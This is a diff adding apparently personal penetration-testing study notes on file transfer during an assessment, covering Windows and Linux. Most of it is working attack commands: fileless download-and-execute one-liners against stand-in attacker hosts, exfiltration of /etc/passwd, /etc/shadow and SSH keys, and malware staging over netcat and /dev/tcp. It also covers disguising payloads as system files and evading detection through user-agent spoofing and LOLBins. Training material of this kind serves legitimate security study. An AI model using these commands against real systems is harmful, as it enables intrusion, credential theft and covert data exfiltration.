@@ -1,0 +1,647 @@
+There are many situations when transferring files from or to a target system is necessary.
+
+Understanding different ways to perfrom file transfers and how networks operate can help us accomplish our goals during an assessment. We mist be aware of host features to prevent these behaviour, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS or IPS which can monitor or block particular ports or uncommon operations
+
+one way we can transfer smaller files is with base64 encode and decode. if we have access to a terminal, we can simply encode the file to a string, then decode it on our machine (as we can simply copy paste strings)
+
+we can encode with a command like:
+cat <filename> |base64 -w 0;echo
+
+then, copy paste the encoded file to something like the base64 decrypt website, or we can decode it in our cli, with:
+
+echo <encoded-text> | base64 --decode
+
+most companies allow outbound HTTP and HTTPS traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. 
+
+PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS, or FTP.
+
+OpenRead		Returns the data from a resource as a Stream(sequence of bytes)
+OpenReadAsync		Returns the data from a resource without blocking the calling thread
+DownloadData		Downloads data from a resource and returns a byte array
+DownloadDataAsync	^^^^^^ without blocking the calling thread
+DownloadFile		Downloads data from a resource to a local file
+DownloadFileAsync	^^^^^^ without blocking the calling thread
+DownloadString		Downloads a string from a resource and returns a string
+DownloadStringAsync	without blocking the calling thread
+
+EXAMPLES:
+
+(New-Object Net.WebClient).DownloadFile('<Target File URL'>, '<output file name and path>')
+
+(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name and Path>')
+
+powershell can also be used to download fileless attacks, which download the payload and execute it directly
+
+IEX (New-Object Net.WebClient).DownloadString('https://attacker.domain/fileless/attack.ps1')
+
+instead of using IEX at the start, we can pipe the output of the command to IEX after running the main DownloadString command by appending | IEX to the end
+
+from powershell 3.0 onwards, we can use Invoke-WebRequest, but it is noticeably slower at downloading files. we can use iwr, curl, and wget as opposed to typing this long command out in full.
+
+Invoke-WebRequest https://attacker.domain/virus.ps1 -OutFile svchostHelper.ps1
+
+when doing iwr, if internet explorer hasnt been configured for the first time, we may get an error. This can be bypassed with the -UseBasicParsing argument
+
+if the error is related to the SSL/TLS secure channel, we can bypass that with the following:
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+
+SMB Downloads
+
+if we want to use SMB, we will need to configure it on our attacking(probably kali) machine:
+
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+to download a file to a local directory (victim/windows) machine, we would use:
+copy \\<attacker-ip>\share\tool.exe
+
+however, most networks disable unauthenticated smb servers. to fix this, we can use:
+
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+to connect we can do:
+
+net use:copy \\<ip>\share /user:test test
+
+
+FTP Downloads
+
+we can use the pyftpdlib module for python.
+we can start a server with
+
+sudo python3 -m pyftpdlib --port 21
+
+on the infected machine, we can then get:
+
+(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+to create a command file for the FTP to execute a command if we dont have an interactive shell, we can do:
+
+C:\WindowsUser> echo open 192.168.49.128 > ftpcommand.txt
+C:\WindowsUser> echo USER anonymous >> ftpcommand.txt
+C:\WindowsUser> echo binary >> ftpcommand.txt
+C:\WindowsUser> echo GET file.txt >> ftpcommand.txt
+C:\WindowsUser> echo bye >> ftpcommand.txt
+C:\WindowsUser> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\WindowsUser>more file.txt
+This is a test file
+
+
+
+PowerShell Base64 Encode&Decode
+
+PS C:\WindowsUser> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" _Algorithm MD5 | select Hash
+
+
+we can copy this content and paste it innto our attack host, use the base64 command to decode it, and use the md5sum application to confirm the file transfer happened correctly
+
+Decode a base64 string in linux:
+
+echo <base64string> | base64 -d > hosts
+
+md5sum hosts (to verify integrity)
+
+
+PowerShell web uploads
+
+Powershell doesnt have a built in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function.
+
+for our webserver, we can use uploadserver, and extended version of pythons http.server module.
+
+(I am using pipx, as pip install and apt install wasnt finding upload server. My use case usage follows)
+
+uploadserver (run inside the directory we want the files to be uploaded to, or use --directory)
+
+To upload a file to this server, we can use: (NOTE: we do need the file PSUpload.ps1)
+
+PS C:\WindowsUser> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\WindowsUser> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+
+PowerShell Base64 Web Upload
+we can use Invoke-WebRequest or Invoke-RestMethod combined with Netcat in order to upload too.
+
+PS C:\WindowsUser> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\system32\drivers\etc\hosts' -Encoding Byte))
+
+PS C:\WindowsUser> Invoke-WebRequest -Uri http://<attacker_ip>:<port>/ -Method POSET -Body $b64
+
+we can catch the base64 data with Netcat on our attacking machine, with:
+
+nc -lnvp <port>
+
+<randomb64string>
+
+we can catch the string with netcat, then do:
+
+echo <base64> | base64 -d -w 0 > hosts
+
+to decode the data and write it to a file called hosts
+
+
+SMB UPLOADS
+
+as SMB is typically blocked on corporate networks, we can use WebDav instead, which is an extension of HTTP, and enables a webserver to behave like a fileserver.
+
+we can use this module with:
+
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+
+
+in order to upload to this, we do:
+
+C:\WindowsUser> dir \\<ip_address>\DavWWWRoot  (DavWWWRoot tells the server to connect to the root directory)
+
+C:\WindowsUser> copy C:\path\to\file.zip \\<ip_address>\DavWWWRoot\
+
+or, if there arent SMB restrictions, we can use the same SMB server as before, connect to it the same way, and upload the file with:
+
+copy C:\path\to\file.zip \\<ip_address>\sharefolder\
+
+
+FTP Uploads
+
+we still use the pyftpdlib module, but this time, when starting it, we apply the '--write' argument to allow individuals to upload to the server
+
+sudo python3 -m pyftpdlib --port 21 --write
+
+to upload from target machine:
+PS C:\WindowsUser> (New-Object Net.WebClient).UploadFile('ftp://<ip_address>/ftp-hosts', 'C:\Windows\system32\drivers\etc\hosts')
+
+to create a command to make the FTP client to upload a file:
+
+C:\WindowsUser> echo open <Ip_address> > ftpcommand.txt
+C:\WindowsUser> echo USER anonymous >> ftpcommand.txt
+C:\WindowsUser> echo binary >> ftpcommand.txt
+C:\WindowsUser> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\WindowsUser> echo bye >> ftpcommand.txt
+C:\WindowsUser> ftp -v -n -s:ftpcommand.txt
+ftp> open <ip_address>
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+
+
+
+
+
+
+
+
+LINUX FILE TRANFER METHODS
+
+Base64 encoding and decoding
+
+if a file is small, we can simply encode a file with base64. to ensure the files integrity, we should get the md5sum of the original file
+
+target:> md5sum id_rsa
+
+we can then use the following command to print the base64 encoded version of a file into our terminal:
+
+target:> cat ir_rsa |base64 -w 0;echo
+
+attacker:> echo -n '<b64 string>'| base64 -d > id_rsa
+
+we can confirm if the file was transferred successfully by cross checking the md5sum of the copied file with the original
+
+
+We can also use wget and curl:
+
+wget http://attacker.com/LinEnum.sh -O /tmp/LinEnum.sh
+
+curl -o /tmp/LinEnum.sh http://attacker.com/LinEnum.sh
+
+
+we can also do these attacks filelessly, by replacing the -o flag and argument with a pipe to its respective executor, for example:
+
+curl http://attacker.com/LinEnum.sh | bash
+
+with wget, we just do the same, and add the -qO- flag:
+
+wget -qO- http://attacker.com/PoC.py | python3
+
+if these options arent available to us, if the target is using bash v2.04 or greater, we can use the /dev/TCP tools for basic file downloads:
+
+CONNECT TO THE TARGET *WEBSERVER*
+exec 3<>/dev/tcp/<ip>/<port>
+
+HTTP GET request
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+Print the response
+cat <&3
+
+
+with ssh, we can download files with the scp command. 
+to enable ssh on the target system, do:
+sudo systemctl enable ssh
+
+we can then start the ssh server with:
+sudo systemctl start ssh
+
+we can then check the SSH listening port with:
+netstat -lnpt
+
+we can then do:
+
+scp <randomusername>@<Target_ip>:/root/myroot.txt .
+
+we use randomusername in order to avoid revealing information about ourselves, the root/myroot.txt is the target file to download, and the '.' tells the command to put the file in our current working directory (on our attacking machine)
+
+
+Linux Uploads
+
+first, we can use uploadserver. one way we can make our target less likely to regect this download is by creating a certificate (self signed)
+
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+the webserver should not host the certificate, we should create a temporary directory to host the file for our webserver:
+
+mkdir https && cd https 
+
+we can now do:		(remember, i downloaded using pipx, may vary per use case)
+sudo uploadserver 443 --server-certificate /path/to/certificate.pem
+
+now, on our comprimised machine,lets get the contents of /etc/passwd and /etc/shadow
+
+curl -X POST https://<attacker_ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure 
+
+(we use --insecure to tell the command we know that the certificate is self signed, but we trust it)
+
+Alternative methods
+
+we can use the python http.server module on our attacking machine, and make our target download the files with:
+
+python3 -m http.server
+
+or
+
+python2.7 -m SimpleHTTPServer
+
+or
+
+php -S 0.0.0.0:8080
+
+or
+
+ruby -run -ehttpd . -p8000
+
+then, we can essentially universally run:
+
+wget <attacker_ip>:<port>/filetotransfer.txt
+
+we can also use scp to upload too, by doing:
+
+scp /local/payload.elf comprimised-account@<target_address>:/path/do/destination
+
+
+
+TRANSFERRING FILES WITH CODE
+
+python (download)
+
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+
+PHP(download)
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+instead of using file_get_contents() and file_put_contents(), we can use fopen(), which will open a URL, read its content and save it to a file
+
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+we can also do a fileless download and execution with php by piping it to bash
+
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+
+
+Ruby(download)
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+
+Perl(Download)
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+
+
+JavaScript(Download)
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+
+if we run this file in our CLI, it will ask for an input for a URL to download a file (essentially, our own homebrew curl)
+
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+
+
+VBScript (Download)
+We can also use VBscript to make our own Curl:
+
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+
+
+UPLOADS
+
+Python3 (Upload)
+
+On our attacking machine, we will need to start our uploadserver again, then, on the target machine, we can upload a file with a one liner:
+
+python3 -c 'import requests;requests.post("http://<attacker_ip>:<port>/upload",files={"files":open("/etc/passwd","rb")})'
+
+
+
+MISC FILE TRANSFER METHODS
+Netcat
+
+lets say we have netcat (Ncat, Netcat, nc, etc.) on a target machine. on the target machine, we can use netcat to open up a channel that will wait specifically for a file that we want it to, like:
+
+ncat -l -p 8000 --recv-only > MalwareStager.exe
+
+then, on our attacking machine, we can send our MalwareStager.exe to the target, with:
+
+ncat --send-only <target_ip> <port> < MalwareStager.exe
+
+should a firewall block inbound connections, we can use our attacking machine as the listener, and our target as the client who comes to us instead:
+
+Attacker:
+sudo nc -l -p 443 -q 0 < MalwareStager.exe
+
+(the -q 0 flag quits after a successful transfer)
+
+Victim:
+nc <attacker_ip> > MalwareStager.exe
+
+we can also do the same with ncat:
+
+sudo ncat -l -p 443 --send-only < MalwareStager.exe
+
+victim:
+ncat <Attacker_ip> --recv-only > MalwareStager.exe
+
+
+should netcat, nc, or netcat not be available on our target, we can use /dev/tcp again.
+
+attacker(nc)
+sudo nc -l -p 443 -q 0 < MalwareStager.exe
+
+attacker(ncat)
+sudo ncat -l -p 443 --send-only <MalwareStager.exe
+
+target machine
+cat < /dev/tcp/<attacker_ip>/<port> > MalwareStager.exe
+
+
+
+PowerShell Session File Transfer
+
+if HTTP, HTTPS or SMB are unavailable, we can use PowerShell Remoting (WinRM) to perform file transfers
+
+to open a WinRM session on the victim device, we need to either:
+be a member of the Remote Management Users group
+have administrative access
+have explicit permissions for PowerShell Remoting
+
+From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
+
+        powershell
+PS C:\htb> whoami
+
+htb\administrator
+
+PS C:\htb> hostname
+
+DC01
+
+        powershell
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+
+Because this session already has privileges over DATABASE01, we don't need to specify credentials. In the example below, a session is created to the remote computer named DATABASE01 and stores the results in the variable named $Session.
+Create a PowerShell Remoting Session to DATABASE01
+
+        powershell
+PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+
+We can use the Copy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa.
+Copy samplefile.txt from our Localhost to the DATABASE01 Session
+
+        powershell
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+Copy DATABASE.txt from DATABASE01 Session to our Localhost
+
+        powershell
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+
+
+RDP
+we can literally copy paste files to and from a windows target using RDP. on Linux, we will use xfreerdp, where we can graphically take the file into our clipboard, move our mouse back to our attacking machine, and paste the file.
+
+in other cases, we can mount a filesystem to our target with xfreerdp or rdesktop:
+
+rdesktop <target_ip> -d <domainname> -u <username> -p <password> -r disk:linux'<path/to/destination/folder>'
+
+xfreerdp /v:<ip> /d:<domainname> /u:<username> /p:'<password>' /drive:linux,/path/to/destination/folder
+(didnt work, corrected command has drive redirection explicitly enabled)
+xfreerdp /v:<ip> /d:<username> /u:<username> /cert:ignore /drive:linux,/tmp/xfreeshare
+
+
+on our target, we must then go to the network folder, and the \\tsclient\linux folder, in order to put files there that will be shared to our linux machine
+
+alternatively, we can use mstsc.exe(on windows)
+
+
+Protected file transfers
+in order to protect our clients, we will have to use much more secure data transfer methods if certain conditions arise. This requires us to work around the eventuality that services like SSH, SFTP, and HTTPS being unuseable to use, but we still need a safe way to exfiltrate data, so we will do the following:
+
+File Encryption on Windows
+one of the best tools for secure file transfers from windows is Invoke-AESEncryption.ps1, an example would be:
+Invoke-AESEncryption -Mode Encrypt -Key "<password>" -Text "I secretly cheated on a test once."
+
+This will encrypt the anything given with the text argument using the supplied password. once exfiltrated, we can decrypt the data with the same tool, simply using the decrypt mode instead of the encrypt mode
+
+on our target, we need to import the module in order to use it freely, this can be done with the command:
+Import-Module .\Invoke-AESEncryption.ps1
+
+File encryption on linux
+
+OpenSSL is frequently included on linux distributions, and we can use it to encrypt and share encrypted files.
+
+example encryption:
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+example decryption:
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+
+
+Catching Files over HTTP/S
+
+in order to set up a webserver that supports encryption, we would need to use Nginx or Apache in order to make a safe to use webserver that supports encryption.
+
+
+Nginx - Enabling PUT
+
+A good alternative for transferring files to Apache is Nginx because the configuration is less complicated, and the module system does not lead to security issues as Apache can.
+
+When allowing HTTP uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. Apache makes it easy to shoot ourselves in the foot with this, as the PHP module loves to execute anything ending in PHP. Configuring Nginx to use PHP is nowhere near as simple.
+Create a Directory to Handle Uploaded Files
+
+        shellsession
+User@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+
+Change the Owner to www-data
+
+        shellsession
+User@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+Create Nginx Configuration File
+
+Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:
+
+        shellsession
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+
+Symlink our Site to the sites-enabled Directory
+
+        shellsession
+
+User@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+Start Nginx
+
+        shellsession
+User@htb[/htb]$ sudo systemctl restart nginx.service
+
+If we get any error messages, check /var/log/nginx/error.log. If using Pwnbox, we will see port 80 is already in use.
+Verifying Errors
+
+        shellsession
+User@htb[/htb]$ tail -2 /var/log/nginx/error.log
+
+2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
+2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
+
+        shellsession
+Userhtb[/htb]$ ss -lnpt | grep 80
+
+LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
+
+        shellsession
+User@htb[/htb]$ ps -ef | grep 2811
+
+user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
+root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
+
+We see there is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.
+Remove NginxDefault Configuration
+
+        shellsession
+User@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
+
+Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt
+Upload File Using cURL
+
+        shellsession
+User@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+
+        shellsession
+User@htb[/htb]$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+
+user65:x:1000:1000:,,,:/home/user65:/bin/bash
+
+Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.
+Using Built-in Tools
+
+In the next section, we'll introduce the topic of "Living off the Land" or using built-in Windows and Linux utilities to perform file transfer activities. We will repeatedly come back to this concept throughout the modules in the Penetration Tester path when covering tasks such as Windows and Linux privilege escalation and Active Directory enumeration and exploitation.
+
+
+LOTL (Living off the land)
+
+Linux - GTFOBins
+Windows - LOLBAS
+
+these binaries give an attacker capabilities to:
+Download
+Upload
+Execute commands
+Read files
+Write to files
+Other bypasses
+
+this module included a walkthrough on using GTFOBins and LOLBAS, but this set of notes is for file uploads, so:
+
+File Download with Bitsadmin (Windows)
+bitsadmin /transfer wcb /priority foreground http://<attacker_ip>:<attacker_port>/<desiredfile>.exe C:\path\to\destination\file.exe
+
+We can also do:
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://<attacker_ip>:<attacker_port/<desiredfile>.exe" -Destination "C:\Windows\Temp\file.exe"
+
+Certutil
+certutil.exe -verifyctl -split -f http://<attacker_ip>:<port>/file.exe
+
+there are many others available on GTFOBins and LOLBAS, which i cant comb through and put in this file, but they are readily available and easy to find with search features on either website.
+
+DETECTION
+it is also quite easy to detect malicious file transfers from a servers point of view, as the user agent for these requests typically contain an artifact of whatever we used. These artifacts range from looking suspicious (to my untrained eye) to relatively normal, with the key giveaway ususally looking to be the file being downloaded or uploaded. This is something to be aware of in any work environments
+
+Detection Evasion
+
+its important to identify what services a company will use internally, like browsers, as this will allow us to meld our illegitemate traffic with their legitimate traffic by changing our user agent (with invoke-webrequest).
+
+to list possible user agents:
+
+POWERSHELL
+PS C:\User>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+once we have identified the available user agents, we dont actually have to copy them in ourselves, we can just use a variable:
+
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::<Name of user agent as seen in previous commands output>
+
+we can then simply do:
+
+Invoke-WebRequest http://<attacker_ip>/stager.exe -UserAgent $UserAgent -Outfile "C:\Users\Public\printerdriver.exe
+
+we can also use a LOLBin with a "misplaced trust" issue, like GfxDownloadWrapper.exe "http://<attacker_ip>/file.exe" "C:\Temp\safefiletrustme.exe"
